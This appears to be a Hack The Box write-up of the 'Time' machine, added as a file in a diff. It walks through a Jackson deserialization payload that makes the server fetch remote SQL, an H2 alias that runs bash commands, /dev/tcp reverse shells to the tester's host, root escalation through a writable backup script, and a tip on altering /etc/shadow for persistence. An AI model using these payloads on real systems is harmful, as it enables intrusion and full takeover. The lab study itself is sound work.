@@ -1,0 +1,177 @@
+Time - Hack The BOX
+
+Ubuntu Box with ssh and http open, Bionic Beaver (OpenSSH 8.2p1 Ubuntu 4ubuntu0.1)
+
+
+Go to the webpage we get a beautifier for json and validated. When we attempt to validate with erroneous text we get the following exception
+Command and Output:
+==============================================================================================================================================
+Input: Pleasesub
+Outptu: Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unrecognized token 'ssjjss': was expecting ('true', 'false' or 'null')
+==============================================================================================================================================
+
+Unhandled errors get displayed. We can attmpt to look for exploits. "Jackson 2019 cve"
+"https://blog.doyensec.com/2019/07/22/jackson-gadgets.html"
+
+Command and Output:
+==============================================================================================================================================
+"[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:mem:\"}]"
+echo -n "[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:mem:\"}]"
+["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:"}]
+==============================================================================================================================================
+
+We enter the payload and get a long error inifinte error when we enter the payload and use the json validator.
+
+Command and Output:
+==============================================================================================================================================
+Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.JsonMappingException: Infinite recursion (StackOverflowError) (through reference chain: org.h2.engine.Database["mainSchema"]->org.h2.schema.Schema["database"]->org.h2.engine.Database["mainSchema"]- ..........
+==============================================================================================================================================
+
+We may have a potential in our hands. Next we will give a payload that will pretend to be java datbase connection to run code that could be run
+on the remote machine. We modify the ip set a netcat listerner
+
+Command and Output:
+==============================================================================================================================================
+"[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8000/inject.sql'\"}]"
+
+["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:"}]┌─[user@parrot-virtual]─[~/htb/time/nmap]
+└──╼ $echo -n "[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8000/inject.sql'\"}]"
+["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.23:8000/inject.sql'"}]
+==============================================================================================================================================
+
+Once we run it using the validator, we get the following back
+Command and Output:
+==============================================================================================================================================
+INPUT: ["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.23:8000/inject.sql'"}]
+┌─[user@parrot-virtual]─[~/htb/time]
+└──╼ $nc -lnvp 8000
+listening on [any] 8000 ...
+connect to [10.10.14.23] from (UNKNOWN) [10.10.10.214] 34620
+GET /inject.sql HTTP/1.1
+User-Agent: Java/11.0.8
+Host: 10.10.14.23:8000
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: keep-alive
+
+==============================================================================================================================================
+
+
+Next we will grab the sql code to get a shell back, will do a ping test first to test.
+SQL CODE:
+=======================================================================================================================A
+CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
+	String[] command = {"bash", "-c", cmd};
+	java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
+	return s.hasNext() ? s.next() : "";  }
+$$;
+CALL SHELLEXEC('ping -c 1 10.10.14.23')
+=======================================================================================================================
+
+Command and Output:
+==============================================================================================================================================
+python3 -m http.server
+┌─[user@parrot-virtual]─[~/htb/time/nmap]
+└──╼ $sudo tcpdump -i tun0 icmp
+[sudo] password for user: 
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+13:42:25.007646 IP 10.10.10.214 > 10.10.14.23: ICMP echo request, id 1, seq 1, length 64
+13:42:25.007680 IP 10.10.14.23 > 10.10.10.214: ICMP echo reply, id 1, seq 1, length 64
+13:43:24.400794 IP 10.10.10.214 > 10.10.14.23: ICMP echo request, id 2, seq 1, length 64
+13:43:24.400806 IP 10.10.14.23 > 10.10.10.214: ICMP echo reply, id 2, seq 1, length 64
+
+
+==============================================================================================================================================
+
+Lets upgrade to reverse shell then.
+
+Command and Output:
+==============================================================================================================================================
+["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.23:8000/inject.sql'"}]
+
+CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
+   String[] command = {"bash", "-c", cmd};
+   java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
+   return s.hasNext() ? s.next() : "";  }
+$$;
+CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.14.23/9001 0>&1')
+
+nc -lnvp 9001
+==============================================================================================================================================
+
+Now we have a shell and we can run LinPEas, we go through the services and we have something unique under timersin system timers.
+Systemd timer. "timer_backup.timer" We can attempt to find this file in /etc
+Command and Output:
+==============================================================================================================================================
+pericles@time:/etc$ find . -name timer_backup.timer
+find: ‘./polkit-1/localauthority’: Permission denied
+find: ‘./ssl/private’: Permission denied
+./systemd/system/timers.target.wants/timer_backup.timer
+./systemd/system/timer_backup.timer
+
+pericles@time:/etc$ find . -name timer_backup.service
+find: ‘./polkit-1/localauthority’: Permission denied
+find: ‘./ssl/private’: Permission denied
+./systemd/system/timer_backup.service
+
+==============================================================================================================================================
+
+It runs a backup service every 10 seconds.
+
+Command and Output:
+==============================================================================================================================================
+WantedBy=timers.target
+pericles@time:/etc$ find . -name timer_backup.service
+find: ‘./polkit-1/localauthority’: Permission denied
+find: ‘./ssl/private’: Permission denied
+./systemd/system/timer_backup.service
+pericles@time:/etc$ cat ./systemd/system/timer_backup.service
+[Unit]
+Description=Calls website backup
+Wants=timer_backup.timer
+WantedBy=multi-user.target
+
+[Service]
+ExecStart=/usr/bin/systemctl restart web_backup.service
+pericles@time:/etc$ find . -name web_backup.service
+find: ‘./polkit-1/localauthority’: Permission denied
+find: ‘./ssl/private’: Permission denied
+./systemd/system/web_backup.service
+pericles@time:/etc$ cat ./systemd/system/web_backup.service
+[Unit]
+Description=Creates backups of the website
+
+[Service]
+ExecStart=/bin/bash /usr/bin/timer_backup.sh
+pericles@time:/etc$ 
+pericles@time:/etc$ cat /usr/bin/timer_backup.sh
+#!/bin/bash
+zip -r website.bak.zip /var/www/html && mv website.bak.zip /root/backup.zip
+
+pericles@time:/usr/bin$ ls -la timer_backup.sh 
+-rwxrw-rw- 1 pericles pericles 88 Apr  3 22:00 timer_backup.sh
+
+==============================================================================================================================================
+
+We come to find that the service makes multiple redundant call to backup the website with final call to bash script that executes. So all we would 
+need to do is modify the file since we have write permission and write a reverse shell and let it execute as root.
+
+Command and Output:
+==============================================================================================================================================
+pericles@time:/usr/bin$ cat timer_backup.sh 
+#!/bin/bash
+bash -c 'bash -i >& /dev/tcp/10.10.14.23/5555 0>&1'
+zip -r website.bak.zip /var/www/html && mv website.bak.zip /root/backup.zip
+
+==============================================================================================================================================
+
+Once you get root you only have a limited amount of time to get persistence or the root flag since the connection is disconnected automatically 
+every 10 seconds.
+
+The way to go about it in the real world would be by making a copy of the /etc/shadow file, and afterwards changing the root password to something
+familiar so that you can switch over easily. Once the test is done copy back the original shadow file back.
+
+Command and Output:
+==============================================================================================================================================
+==============================================================================================================================================
+
